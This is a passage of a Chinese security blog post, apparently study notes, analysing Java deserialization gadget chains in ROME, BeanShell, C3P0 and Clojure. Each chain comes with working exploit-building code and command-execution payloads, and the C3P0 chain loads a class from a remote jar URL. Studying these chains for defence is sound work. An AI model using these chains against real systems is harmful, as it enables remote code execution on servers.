@@ -1,0 +1,884 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java 反序列化漏洞（五） - ROME/BeanShell/C3P0/Clojure/Click/Vaadin | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java 反序列化漏洞（五） - ROME/BeanShell/C3P0/Clojure/Click/Vaadin
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-08-04
+              </span>
+              <span>
+                22 min read
+              </span>
+              
+                <a href="https://su18.org/tag/YWv10I0qb/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+                <a href="https://su18.org/tag/f16FB3h4R/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://su18.org/tag/bbwakgnJvv/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/ysoserial-su18-5.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="rome">ROME</h1>
+<p>俗话说：条条大路通罗马（All Roads Lead to ROME.），ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。</p>
+<p>ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="objectbean">ObjectBean</h3>
+<p><code>com.sun.syndication.feed.impl.ObjectBean</code> 是 Rome 提供的一个封装类型，初始化时提供了一个 Class 类型和一个 Object 对象实例进行封装。</p>
+<p>ObjectBean 也是使用委托模式设计的类，其中有三个成员变量，分别是 EqualsBean/ToStringBean/CloneableBean 类，这三个类为 ObjectBean 提供了 <code>equals</code>、<code>toString</code>、<code>clone</code> 以及 <code>hashCode</code> 方法。</p>
+<p>来看一下 ObjectBean 的 <code>hashCode</code> 方法，会调用 EqualsBean 的 <code>beanHashCode</code> 方法。<br>
+<img src="https://su18.org/post-images/1628129326634.png" alt="" loading="lazy"></p>
+<p>会调用 EqualsBean 中保存的 <code>_obj</code>  的 <code>toString()</code> 方法。</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1628129372928.png" alt="" loading="lazy"></figure>
+<p>而这个 <code>toString()</code> 方法也就是触发利用链的地方，继 BadAttributeValueExpException 之后的另一个使用  <code>toString()</code> 方法触发利用的链。</p>
+<h3 id="tostringbean">ToStringBean</h3>
+<p><code>com.sun.syndication.feed.impl.ToStringBean</code> 类从名字可以看出，这个类给对象提供 toString 方法，类中有两个 toString 方法，第一个是无参的方法。获取调用链中上一个类或 <code>_obj</code> 属性中保存对象的类名，并调用第二个 toString 方法。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1628124751865.png" alt="" loading="lazy"></figure>
+<p>这个方法会调用 <code>BeanIntrospector.getPropertyDescriptors()</code> 来获取 <code>_beanClass</code> 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 <code>_obj</code> 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1628124758244.png" alt="" loading="lazy"></figure>
+<p>获取 getter/setter 方法的逻辑很清晰。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1628127228479.png" alt="" loading="lazy"></figure>
+<p>由此可见，ToStringBean 的 <code>toString()</code> 方法可以触发其中 <code>_obj</code> 实例的全部 getter 方法，可以用来触发 TemplatesImpl 的利用链。</p>
+<h2 id="攻击构造">攻击构造</h2>
+<p>通过上述两个类，我们就可以构造出反序列化利用链了，利用链比较简单，代码如下：</p>
+<pre><code class="language-java">public class Rome {
+
+	public static String fileName = &quot;Rome.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
+		ObjectBean delegate = new ObjectBean(Templates.class, tmpl);
+
+		// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
+		// 先封装一个无害的类
+		ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, &quot;su18&quot;));
+
+		// 放入 Map 中
+		HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+		map.put(root, &quot;su18&quot;);
+		map.put(&quot;su19&quot;, &quot;su20&quot;);
+
+		// put 到 map 之后再反射写进去，避免触发漏洞
+		Field field = ObjectBean.class.getDeclaredField(&quot;_equalsBean&quot;);
+		field.setAccessible(true);
+		field.set(root, new EqualsBean(ObjectBean.class, delegate));
+
+		SerializeUtil.writeObjectToFile(map, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>以上就是 ROME 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 HashMap 反序列化触发 ObjectBean 的 hashCode 方法，再触发 ObjectBean 封装的 ObjectBean 的 toString 方法，会调用。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>com.sun.syndication.feed.impl.ToStringBean#toString()</code></li>
+<li>chain gadget：<code>com.sun.syndication.feed.impl.ObjectBean#toString()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashMap.readObject()
+    ObjectBean.hashCode()
+            EqualsBean.beanHashCode()
+                ObjectBean.toString()
+                    ToStringBean.toString()
+                        TemplatesImpl.getOutputProperties()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>rome : 1.0</p>
+</blockquote>
+<h1 id="beanshell">BeanShell</h1>
+<p>BeanShell 是一个小型的 , 免费的 , 可嵌入的Java源代码解释器 , 具有使用Java编写的对象脚本语言功能。BeanShell 能够执行标准的 Java 语句和表达式 , 也可以使用通用的脚本语言约定和语法将 Java 扩展到脚本域。</p>
+<p>Github地址：https://github.com/beanshell/beanshell<br>
+用户文档：https://beanshell.github.io/manual/bshmanual.html</p>
+<h2 id="前置知识-2">前置知识</h2>
+<h3 id="interpreter">Interpreter</h3>
+<p><code>bsh.Interpreter</code> 就是将 BeanShell 脚本解释并执行的解释器。</p>
+<p>Interpreter 的用法很简单，可以通过 <code>set()</code> 方法来设置变量，然后通过 <code>eval()</code> 方法来解释和执行脚本，解析和设置的变量都会保存在 Interpreter 实例的成员变量 globalNameSpace 中。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1628143106525.png" alt="" loading="lazy"></figure>
+<p><code>bsh.NameSpace</code> 就是一个保存着方法、变量、引入包的命名空间。NameSpace 与一个 Interpreter 实例共同构成了一个 Bsh 脚本对象的上下文。</p>
+<h3 id="xthis">XThis</h3>
+<p><code>bsh.This</code> 是 Bsh 脚本对象类型，一个 This 对象就是一个 Bsh 脚本的对象的上下文，一个 This 对象储存了 NameSpace 和 Interpreter。并提供了一些方法用于操作上下文中的内容：</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1628147707213.png" alt="" loading="lazy"></figure>
+<p>其中 <code>invokeMethod</code> 方法提供了使用 Java 代码从 Bsh 脚本外部调用方法的功能，如下可弹计算器。</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1628148093795.png" alt="" loading="lazy"></figure>
+<p>而 <code>XThis</code> 是 <code>bsh.This</code>  对象的子类，在 This 的基础上添加了通用接口代理机制的支持。也就是 InvocationHandler。</p>
+<p>XThis 中有一个内部类 Handler，实现了 InvocationHandler 接口并重写了 invoke 方法，调用了 <code>invokeImpl</code> 方法。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1628149282435.png" alt="" loading="lazy"></figure>
+<p><code>invokeImpl</code> 方法特殊处理了 <code>equals</code> 和 <code>toString</code> 方法，调用了 invokeMethod 执行对应的方法，并使用 <code>Primitive.unwrap()</code> 处理返回值。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1628150280715.png" alt="" loading="lazy"></figure>
+<p>也就是说，XThis 是一个 Bsh 脚本的对象的代理类，可以在外部通过这个代理类调用 Bsh 脚本的方法。</p>
+<h2 id="攻击构造-2">攻击构造</h2>
+<p>在简单了解了上面两个类的知识后，就可以开始尝试构造调用链了。</p>
+<p>ysoserial 给出的调用链是使用 PriorityQueue 进行触发，然后使用 XThis 中的 Handler 来动态代理 Comparator ，这样在反序列化 PriorityQueue 时会触发 Comparator 的 compare 方法，会调用 XThis 中 Handler 的 invoke 方法去调用，由于这个动态代理类可以调用 Bsh 脚本中的方法，我们可以提前在 XThis 中的 NameSpace 中定义好一个 compare 方法，这样在就能在动态代理中完成调用。</p>
+<p>构造代码如下：</p>
+<pre><code class="language-java">public class BeanShell {
+
+	public static String fileName = &quot;BeanShell.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// compare 函数，需要接受两个参数，返回 Integer 类型
+		String func = &quot;compare(Object whatever,Object dontCare) {java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);return new Integer(1);}&quot;;
+
+		// 将 compare 方法注册至 Interpreter 实例上下文中
+		Interpreter i = new Interpreter();
+		i.eval(func);
+
+		// 创建 XThis 对象，获取其 invocationHandler
+		XThis xt           = new XThis(i.getNameSpace(), i);
+		Field handlerField = XThis.class.getDeclaredField(&quot;invocationHandler&quot;);
+		handlerField.setAccessible(true);
+		InvocationHandler handler = (InvocationHandler) handlerField.get(xt);
+
+		// 使用 XThis$Handler 为 Comparator 创建动态代理
+		Comparator&lt;Object&gt; comparator = (Comparator&lt;Object&gt;) Proxy.newProxyInstance(
+				Comparator.class.getClassLoader(), new Class&lt;?&gt;[]{Comparator.class}, handler);
+
+		// 在初始化时不带入 comparator
+		PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+		queue.add(&quot;1&quot;);
+		queue.add(&quot;2&quot;);
+
+		Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+		field.setAccessible(true);
+		field.set(queue, comparator);
+
+		SerializeUtil.writeObjectToFile(queue, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>那其实有了这种思路，其实可以利用 XThis 来实现任意 kick-off 的触发，因为可以使用动态代理执行任何方法。</p>
+<h2 id="总结-2">总结</h2>
+<p>以上就是 BeanShell 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 PriorityQueue 反序列化触发 Comparator  的 compare 方法，使用 <code>XThis$Handler</code> 动态代理 Comparator，并在其 Interpreter 内构造带有恶意代码的 compare 方法触发调用。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>bsh.This#invokeMethod()</code></li>
+<li>chain gadget：<code>bsh.XThis$Handler#invokeImpl()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PriorityQueue.readObject()
+    Comparator.compare()
+            XThis$Handler.invoke()
+                XThis$Handler.invokeImpl()
+                    This.invokeMethod()
+                        BshMethod.invoke()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>bsh : 2.0b5 (已修复)</p>
+</blockquote>
+<h1 id="c3p0">C3P0</h1>
+<p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate、Spring等。</p>
+<p>关于 C3P0 的使用和关键类的解释在<a href="https://www.cnblogs.com/ZhangZiSheng001/p/12080533.html">这篇文章</a>中写的很详细，本文就不再现学现卖了。</p>
+<h2 id="前置知识-3">前置知识</h2>
+<h3 id="poolbackeddatasourcebase">PoolBackedDataSourceBase</h3>
+<p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code> 本质上也是一个封装对象，其中储存了 PropertyChangeSupport 和 VetoableChangeSupport 对象，用于支持监听器的功能。</p>
+<p>这个类在序列化和反序列化时，要保存内部的 ConnectionPoolDataSource 成员变量，如果 connectionPoolDataSource 本身是不可序列化的对象，则使用 ReferenceIndirector 对其进行引用的封装，返回一个可以被序列化的 IndirectlySerialized 实例对象。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1628475601780.png" alt="" loading="lazy"></figure>
+<p>其中会调用 ConnectionPoolDataSource 的 <code>getReference</code> 方法返回一个 Reference 对象，并使用 ReferenceSerialized 对象对其封装。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1628477293264.png" alt="" loading="lazy"></figure>
+<p>反序列化时，调用其 <code>IndirectlySerialized#getObject()</code> 方法重新生成 ConnectionPoolDataSource 对象。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1628474483615.png" alt="" loading="lazy"></figure>
+<p>ReferenceSerialized 的 <code>getObject()</code> 调用 <code>InitialContext#lookup()</code> 方法尝试使用 JNDI 来获取相应的对象，在 contextName、env 均为空的情况化，则调用 <code>ReferenceableUtils.referenceToObject()</code> 使用 Reference 中的信息来获取。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1628479009475.png" alt="" loading="lazy"></figure>
+<p>可以看到使用了 URLClassLoader 从 URL 中加载了类并实例化。</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1628478965157.png" alt="" loading="lazy"></figure>
+<p>这样就可以通过想办法插入恶意 URL 来触发漏洞。</p>
+<h2 id="攻击构造-3">攻击构造</h2>
+<p>可以看到本条链的调用构造是比较简单的，我们需要构造一个不可序列化的并且实现了 Referenceable 的 ConnectionPoolDataSource 对象，其 <code>getReference()</code> 方法返回带有恶意类位置的 Reference 对象即可。恶意代码如下：</p>
+<pre><code class="language-java">public class C3P0ForHttpBase {
+
+	public static String fileName = &quot;C3P0ForHttpBase.bin&quot;;
+
+	private static final class MyPool implements ConnectionPoolDataSource, Referenceable {
+
+		private String className;
+
+		private String url;
+
+		public MyPool(String className, String url) {
+			this.className = className;
+			this.url = url;
+		}
+
+		public Reference getReference() throws NamingException {
+			return new Reference(&quot;su18&quot;, this.className, this.url);
+		}
+
+		public PrintWriter getLogWriter() throws SQLException {
+			return null;
+		}
+
+		public void setLogWriter(PrintWriter out) throws SQLException {
+		}
+
+		public void setLoginTimeout(int seconds) throws SQLException {
+		}
+
+		public int getLoginTimeout() throws SQLException {
+			return 0;
+		}
+
+		public Logger getParentLogger() throws SQLFeatureNotSupportedException {
+			return null;
+		}
+
+		public PooledConnection getPooledConnection() throws SQLException {
+			return null;
+		}
+
+		public PooledConnection getPooledConnection(String user, String password) throws SQLException {
+			return null;
+		}
+
+	}
+
+	public static void main(String[] args) throws Exception {
+
+		PoolBackedDataSource     p    = (PoolBackedDataSource) SerializeUtil.createInstanceUnsafely(PoolBackedDataSource.class);
+		ConnectionPoolDataSource pool = new MyPool(&quot;org.su18.serializable.PureEvilClass&quot;, &quot;http://localhost:9999/1.jar&quot;);
+
+		Field field = PoolBackedDataSourceBase.class.getDeclaredField(&quot;connectionPoolDataSource&quot;);
+		field.setAccessible(true);
+		field.set(p, pool);
+
+		SerializeUtil.writeObjectToFile(p, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>除了 ysoserial 提供的这条利用链之外，李三师傅还分享了<a href="http://redteam.today/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/">两个其他的 C3P0 利用方式</a>，分别是使用 JndiRefForwardingDataSource/WrapperConnectionPoolDataSource 的 setter 方法触发 JNDI 查询/Hex 类字节码加载的方式，在 fastjson/jackson 中可以利用。</p>
+<h2 id="总结-3">总结</h2>
+<p>以上就是 C3P0 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>反序列化 PoolBackedDataSourceBase 时会处理其中的 ConnectionPoolDataSource，其中会触发 JNDI 查询或 URLClassLoader 加载指定的 jar 文件中的类，在本条利用链中是利用了后者。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>com.mchange.v2.c3p0.impl.BackedDataSourceBase#readObject()</code></li>
+<li>sink gadget：<code>java.net.URLClassLoader#loadClass()</code></li>
+<li>chain gadget：<code>com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized#getObject()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PoolBackedDataSourceBase.readObject()
+    ReferenceIndirector.getObject()
+        ReferenceableUtils.referenceToObject()
+            Class.forName0()
+                URLClassLoader.loadClass()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>c3p0 : 0.9.5.2</p>
+</blockquote>
+<h1 id="clojure">Clojure</h1>
+<p><a href="https://clojure.org/">Clojure</a> 是一种运行在 Java 平台上的 Lisp 方言，Lisp 是一种以表达性和功能强大著称的编程语言。</p>
+<p>类比 Groovy 和 BeanShell，Clojure 又是一条在 Java 上解析和执行的新的一种编程语言的利用链。</p>
+<p>这个漏洞的作者是 JackOfMostTrades，是 <a href="https://github.com/JackOfMostTrades/gadgetinspector">gadgetinspector</a> 的作者，并且在其 2018 年 blackhat 上议题的 <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">PPT</a> 中以此链为例子进行了自动化挖掘的描述。</p>
+<p>也就是说，这条链是非人工挖掘出来的利用链。</p>
+<h2 id="前置知识-4">前置知识</h2>
+<h3 id="clojurejavashellsh">clojure.java.shell.sh</h3>
+<p>clojure 提供了封装的执行命令方法，位于 <code>clojure.java.shell</code> 下的 <code>sh</code> 函数：</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1628556256547.png" alt="" loading="lazy"></figure>
+<p>可以看到是调用了 Java 的 <code>Runtime.getRuntime().exec()</code> 来执行系统命令。使用 clojure 执行系统命令的写法为：</p>
+<pre><code class="language-clojure">(use '[clojure.java.shell :only [sh]])
+(sh&quot;open&quot; &quot;-a&quot; &quot;Calculator.app&quot;)
+</code></pre>
+<p>也可以直接调用 Java 的方法，写为：</p>
+<pre><code class="language-clojure">(import 'java.lang.Runtime)
+(. (Runtime/getRuntime) exec&quot;open -a Calculator.app&quot;)
+</code></pre>
+<p>clojure 的其他写法这里就不描述了。</p>
+<h3 id="compilereval">Compiler.eval</h3>
+<p>想要在 Java 中解析和执行 Clojure 代码，肯定是要有类似 eval 的解析处理函数。那就是 clojure.core 中的 eval 方法。</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1628565321432.png" alt="" loading="lazy"></figure>
+<p>实际调用 <code>clojure.lang.Compiler#eval(java.lang.Object, boolean)</code>。这个函数将会解析和调用传入的对象，通常是 PersistentList 对象。</p>
+<p>我们可以仿照程序逻辑自己写一些调用代码：</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1628565672202.png" alt="" loading="lazy"></figure>
+<h3 id="maineval_opt">main$eval_opt</h3>
+<p>了解了 eval 的执行实现后，接下来找 sink 点。</p>
+<p><code>main$eval_opt.invokeStatic</code> 方法会调用 <code>clojure.core$eval.invokeStatic()</code> 方法。</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1628571567346.png" alt="" loading="lazy"></figure>
+<p>后续调用 <code>Compiler.eval()</code> 触发解析。</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1628571943578.png" alt="" loading="lazy"></figure>
+<p>那直接这样写就可以弹计算器了：</p>
+<pre><code class="language-java">String payload = &quot;(use '[clojure.java.shell :only [sh]])(sh\&quot;open\&quot; \&quot;-a\&quot; \&quot;Calculator.app\&quot;)&quot;;
+main$eval_opt.invokeStatic(payload);
+</code></pre>
+<h3 id="abstracttablemodelff19274a">AbstractTableModel$ff19274a</h3>
+<p>接下来关注一下反序列化漏洞的触发，<code>AbstractTableModel$ff19274a</code> 这个类也是一个封装引用类，这个类有一个成员变量 <code>__clojureFnMap</code>，是一个 IPersistentMap 类型的对象。调用 <code>AbstractTableModel$ff19274a</code> 的很多方法，都是在 IPersistentMap 中寻找储存的对象，并调用其 invoke 方法进行执行的。</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1628574478434.png" alt="" loading="lazy"></figure>
+<p>而 IPersistentMap 可能是 clojure 封装的 Map/Method/Field/Constructor 等对象。对于 Map 类型的对象，可以使用 <code>PersistentArrayMap.create()</code> 方法来封装。</p>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1628574443096.png" alt="" loading="lazy"></figure>
+<p>那么就可以使用这个类作为 hashCode/toString 触发点的后续，调用储存对象的 invoke 方法，而 clojure 里的类又几乎都有 invoke 方法。只需要找到合适的触发链。</p>
+<h3 id="corecompfn__4727">core$comp$fn__4727</h3>
+<p><code>core$comp$fn__4727</code> 类初始化时储存了两个对象</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1628577819155.png" alt="" loading="lazy"></figure>
+<p>在调用其 invoke 方法时，会 <code>this.g</code> 的 invoke 方法，并将结果给  <code>this.f</code> 的 invoke 方法。</p>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1628578569799.png" alt="" loading="lazy"></figure>
+<p>实际上这个类是整条调用链的关键，我们只需要让  <code>this.g</code>  是 <code>main$eval_opt</code> 类，<code>this.f</code> 的 invoke 方法返回待解析的恶意 payload。</p>
+<h3 id="coreconstantlyfn__4614">core$constantly$fn__4614</h3>
+<p><code>core$constantly$fn__4614</code> 将构造函数的对象传入 <code>this.x</code> 中，在调用 <code>doInvoke</code> 方法时返回，而由于其 <code>getRequiredArity()</code> 方法也返回 0，因此调用其 invoke 方法时，也会返回 <code>this.x</code> 中储存的对象。</p>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1628576951249.png" alt="" loading="lazy"></figure>
+<p>因此我们使用这个类来保存待解析的 payload 字符串，在调用这个类的 invoke 方法时即可返回 payload。</p>
+<h2 id="攻击构造-4">攻击构造</h2>
+<p>这里尝试了使用 HashMap 和 BadAttributeValueExpException 两种触发方式均可，最终的攻击代码为：</p>
+<pre><code class="language-java">public class Clojure {
+
+	public static String fileName = &quot;Clojure.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 执行系统命令的两种写法，本质都是使用 java.lang.Runtime 类
+		String payload1 = &quot;(import 'java.lang.Runtime)\n&quot; +
+				&quot;(. (Runtime/getRuntime) exec\&quot;open -a Calculator.app\&quot;)&quot;;
+
+		String payload2 = &quot;(use '[clojure.java.shell :only [sh]])\n&quot; +
+				&quot;(sh\&quot;open\&quot; \&quot;-a\&quot; \&quot;Calculator.app\&quot;)&quot;;
+
+		// 初始化 AbstractTableModel$ff19274a 对象
+		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
+
+		HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+
+		// 使用 core$constantly$fn__4614 保存 payload 对象，调用其 invoke 方法时会返回 payload
+		core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload2);
+		// 将 core$constantly$fn__4614 和 main$eval_opt 保存在 core$comp$fn__4727 中
+		core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());
+
+
+		// 将 hashCode 与 core$comp$fn__4727 进行映射
+		map.put(&quot;hashCode&quot;, core2);
+		model.__initClojureFnMappings(PersistentArrayMap.create(map));
+
+		// 使用 HashMap hashCode 触发
+//		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+//		hashMap.put(model,&quot;su18&quot;);
+//		hashMap.put(&quot;su19&quot;,&quot;su20&quot;);
+//		SerializeUtil.writeObjectToFile(hashMap, fileName);
+
+		// 实例化 BadAttributeValueExpException 并反射写入
+		BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;su18&quot;);
+		Field                         field     = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
+		field.setAccessible(true);
+		field.set(exception, model);
+
+		// 使用 BadAttributeValueExpException toString 触发，还是会调用 hashCode 方法
+		SerializeUtil.writeObjectToFile(exception, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-4">总结</h2>
+<p>以上就是 Clojure 链分析的全部内容了，通过包的类名、方法调用，可以发现这确实不是一般人类能手工挖出来的利用链。最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 HashMap/BadAttributeValueExpException 来触发 <code>AbstractTableModel$ff19274a</code> 的 hashCode/toString 方法，调用其成员变量中保存的 <code>clojure.core$comp$fn__4727</code> 的 invoke 方法，会调用 <code>clojure.core$constantly$fn__4614</code> 的 invoke 方法触发 <code> clojure.main$eval_opt</code> 解析带有恶意的代码 Clojure 代码，造成漏洞。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>clojure.main$eval_opt#invoke()</code></li>
+<li>chain gadget：<code>clojure.core$comp$fn__4727#invoke()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashMap.readObject()
+    AbstractTableModel$ff19274a.hashCode()
+        clojure.core$comp$fn__4727.invoke()
+            clojure.core$constantly$fn__4614.invoke()
+                clojure.main$eval_opt.invoke()
+                    clojure.core$eval.invokeStatic()
+                        Compiler.eval()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>clojure &gt; 1.2.0</p>
+</blockquote>
+<h1 id="click1">Click1</h1>
+<p><a href="https://click.apache.org/">Apache Click</a> 是一个 JEE Web 框架，据官方网站介绍，开发者一天就可以上手跑起服务。</p>
+<p>但是用的人并不多，所以这里也主要关注利用点的相关知识。</p>
+<h2 id="前置知识-5">前置知识</h2>
+<h3 id="propertyutils">PropertyUtils</h3>
+<p>click 中有一个工具类 <code>org.apache.click.util.PropertyUtils</code>，用来操作属性，其中有一个 <code>getValue</code> 方法用来获取某个对象中某个属性的值。</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1628642552541.png" alt="" loading="lazy"></figure>
+<p>方法处理完 name 之后将会调用 <code>getObjectPropertyValue</code> 方法，传入对象实例、属性名和方法缓存三个参数。</p>
+<p>可以看到在 <code>getObjectPropertyValue</code> 方法中，是获取了传入对象实例中指定属性名的 getter 方法，然后通过反射调用。</p>
+<figure data-type="image" tabindex="26"><img src="https://su18.org/post-images/1628642630288.png" alt="" loading="lazy"></figure>
+<p>也就是说，PropertyUtils 的 <code>getValue</code> 方法会触发指定属性的 getter 方法，可以用来触发 TemplatesImpl 利用方式。</p>
+<h3 id="columncomparator">ColumnComparator</h3>
+<p><code>org.apache.click.control.Column</code> 用来提供表格中 <code>&lt;td&gt;</code>/<code>&lt;th&gt;</code> 的一些属性的渲染。Column 类实现了 Serializable 接口，可以被反序列化。</p>
+<p>在 Column 中定义了一个内部类 ColumnComparator，实现了 Comparator 接口，用来比较一个 Column 中的两个 row。</p>
